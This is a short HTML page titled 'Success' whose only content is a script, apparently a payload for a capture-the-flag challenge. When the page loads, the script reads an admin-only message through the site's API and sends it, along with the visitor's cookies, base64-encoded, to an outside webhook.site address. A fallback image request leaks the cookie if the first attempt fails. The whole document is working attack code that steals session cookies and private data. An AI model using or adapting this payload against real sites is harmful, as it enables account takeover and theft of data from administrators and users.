<!DOCTYPE html>
<html>
<head><title>Success</title></head>
<body>
    <script>
      (async () => {
    const webhook = "https://webhook.site/eea9d67e-7379-46ca-b85a-c69dad2bf391";
    const targetMsg = "69ea91cbbee6d6b7c6646454";
    
    try {
        // Step 1: Steal the flag from your message
        const res = await fetch('/api/admin/messages/' + targetMsg);
        const data = await res.json();
        
        // Step 2: Send the flag and the Admin's cookie to your webhook
        await fetch(webhook, {
            method: 'POST',
            mode: 'no-cors',
            body: btoa(JSON.stringify({
                flag: data.content || data,
                cookie: document.cookie
            }))
        });
    } catch (e) {
        // Fallback: Just leak the cookie if the fetch fails
        new Image().src = webhook + "/error?c=" + btoa(document.cookie);
    }
})();
    </script>
</body>
</html>
